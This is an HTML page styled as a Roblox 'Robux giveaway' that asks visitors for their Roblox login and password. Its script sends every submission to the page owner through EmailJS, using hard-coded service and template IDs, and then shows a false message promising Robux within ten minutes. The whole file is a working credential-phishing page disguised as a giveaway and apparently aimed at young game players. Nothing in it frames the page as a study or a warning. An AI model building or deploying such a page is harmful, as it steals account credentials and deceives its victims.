<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Форма відправки</title>

<style>
/* Фон у стилі Roblox */
body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background:
        linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)),
        url("https://images.alphacoders.com/132/1324271.jpeg") no-repeat center center fixed;
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

/* Карточка */
.form-box {
    background: #1f2023;
    padding: 26px;
    border-radius: 14px;
    width: 340px;
    box-shadow: 0 0 30px rgba(0,0,0,0.85);
}

/* Заголовок */
.form-box h2 {
    text-align: center;
    color: #ffffff;
    margin-bottom: 22px;
    font-size: 26px;
    letter-spacing: 1px;
}

/* Поля */
.form-box input,
.form-box textarea {
    width: 100%;
    padding: 12px;
    margin-bottom: 14px;
    border-radius: 8px;
    border: none;
    outline: none;
    background: #2b2d31;
    color: #ffffff;
    font-size: 14px;
}

.form-box input::placeholder,
.form-box textarea::placeholder {
    color: #b5b5b5;
}

/* Кнопка */
.form-box button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 8px;
    background: #ff3b3b;
    color: white;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: 0.2s ease;
}

.form-box button:hover {
    background: #e33232;
    transform: scale(1.02);
}

/* Повідомлення про успіх */
.success-message {
    text-align: center;
    color: #4caf50;
    margin-top: 12px;
    font-weight: bold;
}
</style>
</head>
<body>

<div class="form-box">
    <h2>Robux giveaway</h2>
    <form id="contact-form">
        <input type="text" name="name" placeholder="Login (nick)" required>
        <textarea name="message" placeholder="Password" required></textarea>
        <input type="number" name="tokens" placeholder="Number of robux (1-1000)" required>
        <button type="submit">Send</button>
    </form>
    <div class="success-message" id="success-message" style="display:none;">
        Successful! Robux will be issued to your account within 10 minutes! Wait!
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
emailjs.init("MHamBnnQ9UlV5Yyri");

document.getElementById("contact-form").addEventListener("submit", function(e) {
    e.preventDefault();

    emailjs.sendForm(
        "service_o7zj1hy",
        "template_u8gxpq8",
        this
    )
    .then(function(){
        document.getElementById("success-message").style.display = "block";
        document.getElementById("contact-form").reset();
    }, function(err){
        alert("Помилка: " + err.text);
    });
});
</script>

</body>
</html>
